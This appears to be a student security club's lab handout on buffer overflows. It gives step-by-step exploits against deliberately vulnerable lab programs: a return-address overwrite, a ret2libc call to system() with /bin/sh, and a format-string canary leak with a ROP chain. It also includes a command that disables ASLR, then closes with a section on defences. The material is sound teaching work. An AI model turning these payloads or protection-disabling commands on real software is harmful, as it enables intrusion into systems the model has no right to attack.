---
title: "Meeting_5"
author: ""
type: ""
date: 2023-10-11T17:01:02-04:00
subtitle: ""
image: ""
tags: []
---
# Meeting 5: Buffer Overflows
View the files on github at: <https://github.com/UML-Cyber-Security/Fall_2023/blob/main/Meeting_5_Buffer_Overflows/lab_5.md>

## Table of Contents
  - [phase1.c](#phase1c)
  - [phase2.c](#phase2c)
  - [phase3.c](#phase3c)
    - [Step 1: Identify the Vulnerability](#step-1-identify-the-vulnerability)
    - [Step 2: Leak the Canary](#step-2-leak-the-canary)
    - [Step 3: Locate Relevant Gadgets for ROP](#step-3-locate-relevant-gadgets-for-rop)
    - [Step 4: Craft the Exploit](#step-4-craft-the-exploit)
    - [Step 5: Execute the Exploit](#step-5-execute-the-exploit)
  - [Defenses Against Buffer Overflows](#defenses-against-buffer-overflows)
    - [Stack Canaries (Stack Guard)](#stack-canaries-stack-guard)
    - [Address Space Layout Randomization (ASLR)](#address-space-layout-randomization-aslr)
    - [Non-Executable Stack (NX Bit)](#non-executable-stack-nx-bit)
    - [Bounds Checking](#bounds-checking)
    - [Safe Libraries](#safe-libraries)
    - [Code Reviews and Static Analysis](#code-reviews-and-static-analysis)
    - [Runtime Protection](#runtime-protection)
    - [Control-Flow Integrity (CFI)](#control-flow-integrity-cfi)
    - [Relocation Read-Only (RELRO)](#relocation-read-only-relro)
  - [Further Reading](#further-reading)

## Exploring Buffer Overflows with phase1.c

**Objective**: In this phase, you will exploit a buffer overflow vulnerability to run a `secret_function` that's not meant to be accessed.

### Steps:

1. **Compile the Vulnerable Program**:
   To fully observe the buffer overflow without any protection mechanisms, compile `phase1.c` using the following command:

   `gcc -fno-stack-protector -z execstack -o phase1 phase1.c`

2. **Locate the Secret Function**:
   We need the memory address of `secret_function` for our exploit. Discover it using `gdb`:

   `gdb ./phase1`

   Inside `gdb`, run:

   `info functions secret_function`

   Note down the address displayed for `secret_function`.

3. **Determine the Return Address Location**:
   The goal is to identify where on the stack the return address is so you can overwrite it. 
   
   Given that the buffer is 128 bytes, we'll start by overwriting that. Remember, aside from the buffer, there might be other data between it and the return address. You'll have to experiment a bit.

   ![bufferOverflow.png](bufferOverflow.png)

   Instead of manually entering repeated characters, let's automate it with Python. The following command will send a stream of 128 'A's to fill the buffer, followed by repeated sequences of other uppercase letters. The idea is to see which sequence overwrites the return address. For instance, if the return address shows `0x4242424242`, it indicates that the 'B' sequence is at the location of the return address.

   `python -c "print('A' * 128 + ''.join([chr(i) * 8 for i in range(66, 91)]))" | gdb -q ./phase1 -ex "run"`

4. **Crafting the Exploit**:
   Now that you have located where the return address is, the next step is to replace it with the address of `secret_function`.
   
   For instance, if your offset from the buffer start to the return address was 132 characters and the address of `secret_function` was `0x12345678`, you can exploit the buffer overflow as follows:

   `python -c "print 'A' * 132 + '\x78\x56\x34\x12'" | ./phase1`

Remember, always handle buffer overflows responsibly and ethically. The above is for educational purposes only.

## phase2.c

**Objective**: This phase challenges you to exploit a buffer overflow to execute shell code. The ultimate aim is to invoke the `system()` function to run a shell (`bash`).

### Steps:

1. **Compile the Vulnerable Program**:
   First, we need to compile `phase2.c` in a way that demonstrates the buffer overflow vulnerability:

   ```bash
   gcc -o phase2 phase2.c -fno-stack-protector -z execstack
   ```

2. **Determine the Address of `system()`**:
   Initiate GDB with your compiled binary:

   ```bash
   gdb ./phase2
   ```

   Inside GDB, utilize the `p` command to retrieve and print the address of the `system()` function:

   ```bash
   p system
   ```

   This might yield an output resembling:

   ```bash
   $1 = {<text variable, no debug info>} 0x7ffff7a53440 <system>
   ```

   Record the provided address (e.g., `0x7ffff7a53440`).

3. **Locate the `/bin/sh` String in Memory**:
   Start by determining the location of the environment variable, which can offer clues about where to find the `/bin/sh` string:

   ```bash
   p &environ
   ```

   Assuming this command returns an address like `0x7ffff7b98900`, use it to search for our desired string:

   ```bash
   find 0x7ffff7b98900, +9999999, "/bin/sh"
   ```

   A successful search will produce an address where the string is located, such as:

   ```bash
   0x7ffff7b98957
   ```

   To recap, you should now have:
   - Address of `system()`: (e.g., `0x7ffff7a53440`)
   - Address of `/bin/sh` string: (e.g., `0x7ffff7b98957`)

4. **Craft and Execute the Exploit**:
   Since ASLR can't be globally turned off, launch the program within GDB. Modify the addresses in the Python command below according to the results from your GDB outputs:

   ```bash
   run $(python -c "print('A' * 128 + 'B' * 8 + '\x40\x34\xa5\xf7\xff\x7f' + '\x57\x89\xb9\xf7\xff\x7f')")
   ```

## phase3.c

**Objective**: Use Return-Oriented Programming (ROP) to bypass modern security protections like DEP (Data Execution Prevention) and ASLR (Address Space Layout Randomization). The goal is to set the `global_flag` and then call the `win()` function to achieve a successful exploit.

### Steps:

1. **Compilation**:
   We are big boys now, and we will leave modern protections enabled:

   ```bash
   gcc phase3.c -o phase3
   ```

2. **Identify the Vulnerability**:
   The `printf(buffer);` line in the `greeting()` function represents a format string vulnerability, allowing an attacker to either leak information from or write data to arbitrary memory locations. 

3. **Leak the Canary**:
   The stack canary's purpose is to detect stack buffer overflows before malicious code can execute. We aim to leak this value:

   - Execute the program using multiple `%p` format specifiers to print pointers:

     ```bash
     ./phase3 "$(printf '%p-'%.0s {1..50})"
     ```

   - Identify the canary's position in the output. It will usually stand out as a non-null value amidst irrelevant pointers or null values.

4. **Locate Gadgets for ROP Chain**:
   Our mission is to invoke `set_flag()` and then `win()` in sequence:

   - Use the `ROPgadget` tool to find potential ROP gadgets:

     ```bash
     ROPgadget --binary phase3
     ```

   - Record the addresses of any beneficial gadgets, especially those like `pop rdi; ret`. Also, note the addresses of the `set_flag` and `win` functions.

5. **Craft the ROP Chain**:

   - Start by filling the buffer:

     ```bash
     'A' * 128
     ```

   - Follow up with the previously leaked canary. Format string vulnerabilities allow direct parameter access, which can be used here.
   - Add any necessary padding.
   - Append the ROP gadgets and function addresses in the desired order.

     Here's an illustrative example (ensure you substitute the placeholders with actual addresses and values):

     ```bash
     ./phase3 "$(printf 'A*128' + '%10$p' + '<ROP GADGETS>' + '<set_flag address>' + '<win address>')"
     ```

   Remember to adapt the format string position (`%10$p` in this instance) based on your findings in Step 3.

6. **Launch the Exploit**:

   After crafting the payload, execute it against the `phase3` binary. If everything is correctly set, the program will respond with:

   ```bash
   You win! Nice ROP chain!
   ```

**Note**: This exercise, like the others, is intended for educational purposes. Always exercise responsible and ethical behavior when dealing with exploits and vulnerabilities.


## Defenses Against Buffer Overflows

### Stack Canaries (Stack Guard)
Stack canaries insert a random value before the stack return pointer. If altered, the program exits, thwarting control-flow hijacking. Its random nature ensures robust defense.

We can disable the stack canary in gcc with the flag `-fno-stack-protector`

### Address Space Layout Randomization (ASLR)
ASLR shuffles memory segment base addresses with each program run, complicating an attacker's predictions of memory locations. This makes exploits unreliable.

The `-no-pie` flag will produce a non-PIE (Position Independent Executable) binary.

If we had sudo on the lab machines, we could disable ASLR until the next reboot with `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`. By echo-ing 0, we are setting ASLR mode to 0.
    A value of 0 disables ASLR.
    A value of 1 randomizes the positions of the stack, virtual dynamic shared object page, and shared memory regions.
    A value of 2 (which is typically the default on many distributions) randomizes the positions of the stack, virtual dynamic shared object page, shared memory regions, and the data segment.

### Non-Executable Stack (NX Bit)
The NX bit in modern CPUs marks memory regions as non-executable. While this thwarts traditional shellcode attacks on the stack, ROP-based exploits remain viable.

We can disable the NX bit with the `-z execstack` flag for gcc.

### Bounds Checking
Built-in compiler and language bounds checks ensure buffer limits. Violations result in program termination or exceptions, preventing overflows.

gcc doesn't have a bounds checker, but you can use address sanitizer to check it.
`-fsanitize=address`

### Safe Libraries
Safer alternatives to historically vulnerable C functions are now recommended. Functions like `strncpy()` are favored over `strcpy()`, as they limit the number of bytes copied based on the size of the destination buffer, preventing potential overflows.

`-Wall -Wextra` 
### Code Reviews and Static Analysis

Code reviews involve experts examining code for vulnerabilities and best practice deviations. Static analysis tools, like Clang Static Analyzer or SonarQube, automatically detect potential risks in the code.

The `-fanalyzer` option in newer versions of GCC provides some static analysis capabilities:

`gcc -fanalyzer source.c`

### Runtime Protection
Runtime protection tools, like AddressSanitizer, identify memory violations in real-time. Upon detecting threats, these tools immediately stop program execution, thwarting potential malicious exploits.

Using address sanitizer with gcc:

`-fsanitize=address`

### Control-Flow Integrity (CFI)
CFI ensures program execution adheres to predefined paths, limiting deviations. This compiler-level defense effectively mitigates ROP and JOP attacks.

gcc flags:

`-fcf-protection=full`

### Relocation Read-Only (RELRO)
RELRO secures binary sections by making them non-writable. With Full RELRO, the GOT becomes non-writable, preventing common overwrite attacks aiming at execution flow diversion.

To enable RELRO in GCC when linking:

`-Wl,-z,relro,-z,now`

This command enables both RELRO and "BIND_NOW". The combination of these is often referred to as "Full RELRO". Without `-z,now`, it would be "Partial RELRO".

## Further Reading
Metasploit has tools to create patterns to more easily find buffer overflows. <https://www.oreilly.com/library/view/mastering-metasploit/9781788990615/bce3f344-5e58-4928-b948-d57f0f949338.xhtml>

Auto buffer overflow: <https://github.com/ChrisTheCoolHut/Zeratool>

ROP: <https://en.wikipedia.org/wiki/Return-oriented_programming>

SEED Labs Buffer Overflows: <https://seedsecuritylabs.org/Labs_20.04/Software/>